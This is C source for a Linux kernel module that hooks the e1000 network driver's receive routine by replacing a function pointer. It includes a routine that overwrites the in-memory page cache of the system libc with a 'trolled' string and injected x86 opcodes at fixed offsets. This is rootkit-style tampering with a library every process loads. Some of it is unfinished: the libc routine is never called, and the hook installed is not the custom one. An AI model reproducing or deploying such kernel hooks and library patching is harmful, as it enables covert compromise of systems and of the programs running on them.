#include "taskutil.h"
#include "memutil.h"
#include "depend.h"
#include "address_space.h"
#include "networking.h"
#include "e1000.h"
#include "e1000_hw.h"
#include "e1000_osdep.h"
#include "e1000_hook.h"
#ifndef VICTIM_FILE
#define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.33.so"
#endif

const char* net_adapter = "e1000";

#define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"

#define STRINGIFY(A) #A
#define TOSTRING(A) STRINGIFY(A) //I don't why the fuck this works. If I had to take a guess, it is because when you pass in A in TOSTRING, you pass in the value of A which is then stringifyed.



struct e1000_adapter* e1000;

bool (*old_clean_rx)(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do);
//old_clean_rx is always e1000_clean_rx_irq if we are using standard sized frames

bool new_clean_rx(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do){
  
  int i = rx_ring -> next_to_clean;
  struct e1000_rx_desc *rx_desc = E1000_RX_DESC(*rx_ring, i);
  struct e1000_rx_buffer *buffer_info = &rx_ring->buffer_info[i];


  while(rx_desc->status & E1000_RXD_STAT_DD){
    
    //dma_sync_single_for_cpu(&adapter->pdev->dev,buffer_info->dma,rx_desc->length,DMA_FROM_DEVICE);
    //memset(buffer_info->rxbuf.data, 0x0, rx_desc->length); //lmao

    //removing debugging information is important to to have zero all buffers. IDK why this is. It might have something to do with 
    
    
    //printk("Zeroed the %d buffer", i);

      int j = 0;
      for(; j<rx_desc -> length; j++){

      }

      i = (++i%rx_ring->count);
      rx_desc = E1000_RX_DESC(*rx_ring, i);
	    buffer_info = &rx_ring->buffer_info[i];
    } 
    
    //return 0;
  return old_clean_rx(adapter, rx_ring, work_done, work_to_do); //LULW
}



const char* troll = "trolled";
struct inode* i;
struct page* old_opcode;
struct page* new_opcode;
struct page* old_troll;
struct page* new_troll;
char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nops

void page_cache_test(void){
  char* path = VICTIM_FILE_OVERRIDE;
  i = get_file_path(path);//
  if(!i){
    printk(KERN_INFO "Invalid path\n");
    return;
  }
  printk(KERN_INFO "Path Succeeded\n");

  if(i -> i_mapping == NULL){
    printk(KERN_INFO "This page does not have an address_space object - it is likely not file-mapped\n");
    return;
  }
  printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");

  //fuckery(i, 0x00191027);

  //unmap_page(i, 0x00107c10);
  write_string_page_cache(i, 0x00191027, troll, 8, &new_troll, &old_troll);
  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, &new_opcode, &old_opcode);
  

}


int init_module(void)
{
  
  struct pci_dev* pd = find_pci(net_adapter, 5);
  
  if(pd){
    printk("pci name: %s\n", get_dev_name(pd));
  }else{
    printk(KERN_INFO "Couldn't find a pci device with name %s\n", net_adapter);
    return 0;
  }
  struct net_device* nd = get_net_dev(pd);
  printk(KERN_INFO "%s\n", get_dev_name(pd));
  if(!nd){
    printk(KERN_INFO "Couldn't find net_device. This is likely not a net device\n");
    return 0;//printk(KERN_INFO "tx queue len:%d\n", nd->tx_queue_len);
  }


  printk("MTU: %u\n", nd -> mtu);
  e1000 = get_e1000_adapter(nd);
  
  if(!e1000){
    printk(KERN_INFO "Couldn't find e1000 adapter");
    return 0;
  }


  old_clean_rx = e1000->clean_rx; //save old clean_rx
  
  e1000->clean_rx = e1000_clean_rx_irq; 


  printk(KERN_INFO "clean_rx replaced\n");

  return 0;
}
void cleanup_module(void)
{

  e1000->clean_rx = old_clean_rx;
  //replace_page(new_opcode, old_opcode);
  //replace_page(new_troll, old_troll); //flipped around because old is the new now. 


	printk("Module cleanup\n");
}
MODULE_LICENSE("GPL");
  